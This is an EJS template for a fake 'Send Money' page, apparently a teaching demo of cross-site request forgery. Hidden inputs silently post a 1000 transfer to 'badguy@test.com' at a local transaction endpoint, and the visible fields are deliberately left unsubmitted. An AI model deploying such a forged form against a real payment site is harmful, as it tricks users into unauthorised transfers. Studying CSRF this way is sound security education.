<%- include('includes/head.ejs', { title: 'Transaction' }) %>
<link rel="stylesheet" href="/styles/forms.css">
</head>
<body>
  <%- include('includes/header.ejs') %>
  <main>
    <h1>Send Money</h1>
    <form action="http://localhost:3000/transaction" method="POST">
      <div class="form-control">
        <label for="recipient">Recipient Email</label>
        <input type="email" id="recipient">
      </div>
      <div class="form-control">
        <label for="amount">Amount</label>
        <input type="text" id="amount">
      </div>
      <!-- The above input values doesn't have name attributes on them. Therefor, the values entered  -->
      <!-- inside that is useless. -->
      <!-- Below are the two hidden inputs that contain the actual values that will be sent to the "real site" -->
      <input type="hidden" name="recipient" value="badguy@test.com">
      <input type="hidden" name="amount" value="1000" >
      <!-- When the user clicks the send button, these hidden inputs get triggered and and the transactions will be -->
      <!-- sent to the email of this hidden input and the amount sent will be set to 1000.  -->
      <button class="btn">Send</button>
    </form>
  </main>
</body>
</html>